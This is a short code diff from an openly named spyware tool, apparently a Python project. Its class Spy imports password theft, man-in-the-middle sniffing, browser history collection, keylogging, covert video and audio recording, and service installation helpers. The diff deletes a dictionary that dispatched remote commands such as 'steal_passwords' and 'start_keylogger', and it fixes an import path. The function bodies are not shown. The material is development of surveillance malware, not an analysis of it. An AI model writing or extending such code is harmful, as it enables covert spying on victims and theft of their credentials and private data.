@@ -1,6 +1,4 @@
 import os
-import subprocess
-import tempfile
 import threading
 from datetime import datetime
 from pathlib import Path
@@ -19,7 +17,7 @@ from spying.encrypt import Encryptor
 from spying.MITM import netstart, filestart, stop_sniffing, is_MITM_runs
 from spying.pc_passwords import get_secrets
 from spying.browser import get_browser_info, list_of_history_to_str
-from service import secure_files, check_status, is_started, is_installed, start_service, remove_service,\
+from spying.service import secure_files, check_status, is_started, is_installed, start_service, remove_service,\
     install_service, remove_services
 
 
@@ -31,17 +29,6 @@ class Spy:
         self.video_recorder: Optional[VideoRecorder] = None
         self.audio_recorder: Optional[AudioRecorder] = None
         self.encryptor: Optional[Encryptor] = None
-        self.ok_commands = {
-            "steal_passwords": self.steal_passwords,
-            "start_keylogger": self.start_keylogger,
-            "stop_keylogger": self.stop_keylogger,
-            "start_video_audio_record": self.start_video_audio_record,
-            "start_video_record": self.start_video_record,
-            "start_audio_record": self.start_audio_record,
-            "stop_video_audio_record": self.stop_video_audio_record,
-            "stop_video_record": self.stop_video_record,
-            "stop_audio_record": self.stop_audio_record
-        }
 
     @staticmethod
     def steal_passwords() -> str:
